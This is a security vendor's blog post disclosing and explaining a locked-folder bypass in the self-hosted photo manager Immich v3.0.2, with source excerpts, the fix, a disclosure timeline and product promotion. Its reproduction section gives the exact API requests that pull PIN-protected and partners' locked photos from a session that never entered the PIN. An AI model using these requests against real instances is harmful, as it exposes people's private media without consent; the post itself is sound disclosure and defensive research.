---
schema_version: "1.0.0"
document_id: "165a879690aa04c03cfa526f3315b715c946e7e41dd350808ce9adbc9a8af86e"
company_key: "yc-escape"
company: "Escape"
source_id: "yc-escape-rss-d1370620bfa7"
canonical_url: "https://escape.tech/blog/how-escape-dast-bypassed-immichs-locked-folder/"
published_at: "2026-07-16T16:52:56+00:00"
first_seen_at: "2026-07-20T23:23:55.281376+00:00"
fetched_at: "2026-07-28T20:37:08.491459+00:00"
content_hash: "sha256:00480583d53bfb9d736e47249bb70d586b28bf231d7f2f8baa9de172fc1288f4"
---

# How Escape DAST Bypassed Immich's Locked Folder By Finding a Missing Default

Some vulnerabilities come from an application doing something it was never supposed to, but Immich's server did exactly what it was told on every request, and that's where the core problem lay.


What broke wasn't an a stray injection point or an unescaped string but a business rule: PIN-protected photos must never reach a session that hasn't entered the PIN. While this rule was correctly implemented in four sibling search handlers, it was quietly omitted from a fifth.


Instead of seeing a form field and running payloads,[Escape's DAST](https://escape.tech/product/dast) was built to see authorization boundaries and test whether they hold against every endpoint on an attack surface. That's what led us to discover a missing default in Immich's search API. Here's a breakdown of how we did it.


## TL;DR: Why It Matters


**Locked folder bypass** : Immich's "locked folder" hides sensitive assets behind a PIN-elevated session. Four of the five search endpoints enforce that;` POST /search/random` doesn't. Send it with the` visibility` field simply *omitted* and it returns the caller's locked assets from a session that never entered the PIN, and, with a partner relationship, the partner's locked assets too.


## Meet Immich


[Immich](https://immich.app/) is a self-hosted media manager - think a private Google Photos you run yourself. It's crossed[100,000+ GitHub stars](https://github.com/immich-app) as of mid-2026, and is one of the fastest-growing self-hosted projects around. We spent some time on its server and found a vulnerability in one of its privacy features, rated at least 'High' in severity.


Immich's "locked folder" is meant to keep your most private assets behind a PIN. It turns out you can skip that PIN with a single request: ask one search endpoint for random assets, leave a field out, and the locked photos come back to a session that never entered the PIN.


Everything here matches Immich` v3.0.2` . You can read the source in the exact state we did,[at commit 352c8086f](https://github.com/immich-app/immich/tree/352c8086f9275885a201d9636b743324aa6a6c57) . Immich is[open source on GitHub](https://github.com/immich-app/immich) , which is what let us trace the vulnerability down to the line. The proof of concept is a standalone Node script that lives next to this report, in` lockedfolder-search-random-bypass/` , and runs against the local Docker stack in` poc/docker-compose.yml` , get it from[Github](https://github.com/0ri0nexe/immich-poc) .


It's a[Broken Access Control](https://owasp.org/www-community/Broken_Access_Control) flaw in the server's[business logic](https://escape.tech/blog/what-is-business-logic-and-why-its-important/) , not in the auth or crypto core which held up well. It needs no memory-safety exploit, no admin account, and no misconfigured deployment: a normal account is enough.


## How This Was Found


We reviewed the obvious surfaces first: authentication, session tokens, bulk-asset IDOR, stored XSS, SSRF, and none turned up an unconditional high-severity vulnerability. So attention moved to business logic, and specifically to features that implement a *security control* the rest of the app has to respect everywhere. Immich has exactly such a control: the **locked folder** (assets with visibility` locked` ), meant to be readable only from a session that's been elevated by entering the account PIN.


A control like this has one demanding property: it has to be re-applied in every place that can read assets. Search is a good place to look. It aggregates large sets of assets from client-supplied filters, and there's more than one search entrypoint. Whenever the same invariant, here, *"a` locked` asset must never be returned to a non-elevated session"* , has to be re-implemented across several sibling handlers, the classic failure is that **one of them forgets** .


So we lined up the five search methods in` server/src/services/search.service.ts` side by side. The correct shape is a two-layer defense. First, a guard that blocks the *explicit* locked value:


```text
if (dto.visibility === AssetVisibility.Locked) {
requireElevatedPermission(auth);
}


```


Second, and this is the part that matters, a **default** for the case where the client sends nothing at all, applied when the query is handed to the repository. It's present in` searchMetadata` ,` searchStatistics` ,` searchLargeAssets` and` searchSmart` :


```text
visibility: dto.visibility ?? (auth.session?.hasElevatedPermission ? undefined : 'not-locked'),


```


` searchRandom` is the odd one out (` search.service.ts` ):


```text
async searchRandom(auth: AuthDto, dto: RandomSearchDto): Promise<AssetResponseDto[]> {
if (dto.visibility === AssetVisibility.Locked) {
requireElevatedPermission(auth);          // layer 1 present…
}
const userIds = await this.getUserIdsToSearch(auth, dto.visibility);
const items = await this.searchRepository.searchRandom(dto.size || 250, { ...dto, userIds }); // …layer 2 MISSING
return items.map((item) => mapAsset(item, { auth }));
}


```


It has the guard but not the default.` { ...dto, userIds }` forwards` dto.visibility` verbatim, and when the field is absent it stays` undefined` .


The next question was whether an` undefined` visibility actually means "no filter" downstream, or whether it's defaulted somewhere safe. It isn't defaulted. The query builder in` server/src/utils/database.ts` only applies the visibility predicate when the value is truthy:


```text
.$if(!!options.visibility, (qb) =>
options.visibility === 'not-locked'
? qb.where('asset.visibility', '!=', AssetVisibility.Locked)
: qb.where('asset.visibility', '=', options.visibility!),
)


```


` !!undefined === false` , so the whole` .$if` block is skipped: **no` WHERE asset.visibility` clause is emitted, and every visibility,` locked` included, comes back.** The guard doesn't save it either.` requireElevatedPermission` (` utils/access.ts` ):


```text
// server/src/utils/access.ts
export const requireElevatedPermission = (auth: AuthDto) => {
if (!auth.session?.hasElevatedPermission) {
throw new UnauthorizedException('Elevated permission is required');
}
};


```


…only runs inside the` if (dto.visibility === Locked)` branch. Everything around the vulnerable method points the same way: the route is open to a plain token with no elevation requirement, the DTO leaves` visibility` optional and un-defaulted, and the repository forwards` options` straight into the shared builder:


```text
// server/src/controllers/search.controller.ts, reachable with any normal token
@Post('random')
@Authenticated({ permission: Permission.AssetRead })         // no admin, no PIN elevation


// server/src/dtos/search.dto.ts (inside RandomSearchSchema), optional, no default
visibility: AssetVisibilitySchema.optional(),


// server/src/repositories/search.repository.ts, options (incl. the undefined visibility) go straight to the builder
async searchRandom(size: number, options: AssetSearchOptions) {
return searchAssetBuilder(this.db, options) /* … */;
}


```


` AssetVisibility.Locked` is the` 'locked'` enum value (` enum.ts` ), and the returned rows are mapped to full asset DTOs, id, paths, EXIF, thumbnail links, via` mapAsset` in` search.service.ts` . So this is a full read, not a mere id leak.


The full chain is therefore:


```text
POST /search/random { }        (visibility OMITTED, session without PIN)
└─ dto.visibility !== Locked → requireElevatedPermission never called
└─ repository called with visibility = undefined (no not-locked default)
└─ searchAssetBuilder: .$if(!!undefined) = .$if(false) → NO visibility filter
└─ result: assets of every visibility, locked included


```


There's a second, slightly worse detail.` getUserIdsToSearch` (` search.service.ts` ) carries a comment, "Locked assets are personal. Never include partner IDs", and only restricts to` \[auth.user.id\]` when` visibility === Locked` :


```text
// server/src/services/search.service.ts
private async getUserIdsToSearch(auth: AuthDto, visibility?: AssetVisibility): Promise<string[]> {
// Locked assets are personal. Never include partner IDs, regardless of A's elevated session.
if (visibility === AssetVisibility.Locked) {
return [auth.user.id];
}
const partnerIds = await getMyPartnerIds({ userId: auth.user.id, repository: this.partnerRepository, timelineEnabled: true });
return [auth.user.id, ...partnerIds];
}


```


Omitting the field falls into the other branch:` \[self, ...partnerIds\]` . So one omission bypasses **two** protections at once, the PIN requirement *and* the partner-exclusion built specifically to keep locked assets private. A partner's locked assets come back too.


## Files & Code Involved


Layer File What


Route` search.controller.ts`` @Post('random')` +` @Authenticated({ permission: AssetRead })` , no elevation


DTO` search.dto.ts`` visibility: AssetVisibilitySchema.optional()` in` RandomSearchSchema` , no default


**Service (the bug)**` search.service.ts`` searchRandom` , guard present,` not-locked` default **missing**


Service (correct siblings)` search.service.ts` the` ?? 'not-locked'` default in` searchMetadata` /` searchStatistics` /` searchLargeAssets` /` searchSmart`


Repository` search.repository.ts`` searchRandom → searchAssetBuilder(this.db, options)`


**Sink**` utils/database.ts`` .$if(!!options.visibility, …)` , skipped when` undefined`


Guard` utils/access.ts`` requireElevatedPermission` , only on explicit` Locked`


Partner scope` search.service.ts`` getUserIdsToSearch`


Enum` enum.ts`` AssetVisibility.Locked = 'locked'`


## Is This Really Impactful?


An honest question to ask is **whether reading *your own* locked assets is a vulnerability at all. The answer is it is.** The locked folder is a second factor, a PIN, layered on top of an already-authenticated session. Its whole purpose is that holding a live session *isn't* enough to see the private assets. Any situation that relies on that, an unattended but unlocked session, a shared or borrowed device, a session obtained without the PIN, falls to a single request. And in the partner case, it's a straightforward cross-user leak of assets the owner never shared.


The severity is high and (CVSS 3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N), for the same-user case, **unconditional** . The only precondition is that the user has locked assets, which is the whole point of the feature. No IdP, no special configuration.


We confirmed the vulnerability by isolating three signals in one never-elevated session. The two other controls work *elsewhere* but fail precisely on the` random` -without-` visibility` path, which rules out a false positive:


Request (session never PIN-unlocked) Expected if the theory holds Observed


` POST /search/metadata {}` locked asset **hidden** (layer 2 present) absent


` POST /search/random {"visibility":"locked"}` **rejected** (layer 1 present) HTTP 401


` POST /search/random {}` locked asset **returned** (layer 2 missing) present


## How Escape DAST Detects This


The property that makes this vulnerability hard to catch by eye - four sibling handlers correct and one silently missing a default - is the property that makes it a natural fit for automated dynamic testing. A scanner doesn't reason about the four handlers that are right. It exercises each endpoint on its own and compares what actually comes back against the invariant.


Pointed at the same` v3.0.2` build, Escape reproduces the attacker path with no source reading. During a scan the engine authenticates as an ordinary user, enumerates the search endpoints from the observed API surface, and replays them while varying their parameters, including the case where the optional` visibility` filter is dropped entirely. It then checks an object-level access-control invariant on each response: a session that hasn't been PIN-elevated must never be handed an asset whose visibility is` locked` . On` POST /search/random` with` visibility` omitted, that invariant breaks. The issue is surfaced automatically, classified as[broken object level authorization](https://escape.tech/blog/understanding-broken-object-level-authorization/) , with the exact request/response pair attached as evidence.


💡


[Discover more about the algorithm behind Escape's business logic testing](https://escape.tech/blog/escape-proprietary-algorithm/)


We confirmed this against a live instance of this exact version. Authenticated as a normal, never-elevated user, the automatically replayed` /search/random` with` visibility` omitted returned the` locked` asset and got flagged. The same call constrained to` visibility: timeline` returned nothing locked and raised nothing, so the check catches the real bypass without firing on legitimate traffic. And because the invariant is asserted on every asset-returning endpoint the scan reaches, the "one handler forgot" failure mode is caught wherever it shows up, and stays caught in CI as the API evolves.


## Reproduction


You can reproduce this against a stock Immich in a few minutes; nothing here is specific to a lab setup.


1. **Deploy Immich locally.** Follow the official[Docker install](https://immich.app/docs/install/docker-compose/) and pin the server image to` v3.0.2` , the version this was confirmed on (later releases may be patched). Open the web UI and create the admin account.
2. **Add a normal user** from the admin panel (or let it self-register). Everything below uses that plain account, no admin rights, and its access token as a` Bearer` . You get one with:


```text
POST /api/auth/login   { "email": "user@example.com", "password": "..." }   →  { "accessToken": "<TOKEN>" }


```


1. **Put an asset in the locked folder** (the only step that needs the PIN-elevated session). As that user, set a PIN, unlock the session, upload a photo, then move it to` locked` :


```text
POST /api/auth/pin-code         { "pinCode": "135790" }
POST /api/auth/session/unlock   { "pinCode": "135790" }
POST /api/assets                (multipart/form-data: assetData=<photo>, deviceAssetId, deviceId, fileCreatedAt, fileModifiedAt)  →  { "id": "<ASSET_ID>" }
PUT  /api/assets                { "ids": ["<ASSET_ID>"], "visibility": "locked" }


```


1. **Open a fresh session without the PIN.** Log in again (step 2) and do *not* call` /auth/session/unlock` . This is exactly the state the locked folder is meant to protect against.
2. **Fire the three requests** from that non-elevated session, each with` Authorization: Bearer <TOKEN>` , and compare the returned asset ids:


```text
POST /api/search/metadata   {}                          →  locked asset ABSENT   (layer 2 works here)
POST /api/search/random     { "visibility": "locked" }  →  401 rejected          (layer 1 works)
POST /api/search/random     { "size": 1000 }            →  200, locked asset PRESENT   ← the bypass


```


The third response carrying an asset with` "visibility": "locked"` , from a session that never entered the PIN, is the vulnerability itself. For the cross-user variant, give the user a partner and repeat step 5 as the partner: the same omission returns the partner's locked assets too.


## Remediation & Coordinated Disclosure


The fix was to apply the same default the four sibling methods use, before the repository call in` searchRandom` :


```text
const visibility = dto.visibility ?? (auth.session?.hasElevatedPermission ? undefined : AssetVisibility.Timeline /* not-locked */);


```


Better still, you can compute the effective visibility in a single shared helper used by all five search entrypoints, so the invariant can't drift out of sync between them again. Neither change touches the query builder or the PIN mechanism itself, the underlying issue is one missing default, not a broken control.


We privately reported the vulnerability to the Immich team in accordance with their security policy. Following a prompt response the vulnerability was swiftly patched on the same day, highlighting Immich's commitment to security and safeguarding client data.


### Disclosure timeline


July 13, 2026: Vulnerability privately reported to the Immich security team


July 13, 2026: A comprehensive patch was deployed


## Conclusion


This is a Broken Access Control issue in Immich's privacy features, reproducible by anyone with a normal account and a short script, no privileged network position, no exploit of the crypto/auth core. The locked-folder bypass turns a one-line omission, a missing default in one of five sibling search handlers, into a defeat of the PIN control protecting the most sensitive assets.


The fix is small and local: apply the visibility default the other search methods already use. It doesn't touch the query builder or the PIN mechanism itself, the underlying issue is one missing default, not a broken control.


The vulnerability also has a shape that automated testing is good at: an invariant that has to hold across sibling endpoints, defeated because one of them drifted. That's exactly what Escape checks by replaying real traffic as real users and reading the server's own answers back.


Learn more about[Escape DAST](https://escape.tech/product/dast) and what it could do on your attack surface.


---


💡 **Want to discover more about Escape's DAST and its capabilities?**


- [DAST is dead, why Business Logic Security Testing takes center stage](https://escape.tech/blog/dast-is-dead-why-business-logic-security-testing-takes-center-stage/)
- [How to Implement Multi-User Testing in DAST: Real-World Examples](https://escape.tech/blog/multi-user-dast-testing-real-world-examples/)
- [Top 11 DAST tools for DevSecOps in 2026: APIs, CI/CD & business logic](https://escape.tech/blog/top-dast-tools/)
- [We benchmarked DAST products, and this is what we learned](https://escape.tech/blog/dast-tools-benchmark/)
- [How Escape AI Pentesting Exploited SSRF in LiteLLM](https://escape.tech/blog/how-escape-exploited-ssrf-in-litellm/)
- [How Cascade Found an Unauthenticated RCE and Walked Around the WAF](https://escape.tech/blog/how-ai-pentesting-found-an-unauthenticated-rce-and-walked-around-the-waf/)
